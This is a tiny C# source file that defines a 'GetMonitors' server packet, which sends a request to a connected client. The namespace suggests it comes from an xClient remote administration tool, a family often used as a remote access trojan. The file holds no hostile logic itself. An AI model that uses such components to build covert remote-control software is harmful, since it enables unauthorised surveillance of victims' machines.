using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class GetMonitors : IPacket
{
	public void Execute(Client client)
	{
		client.Send(this);
	}
}
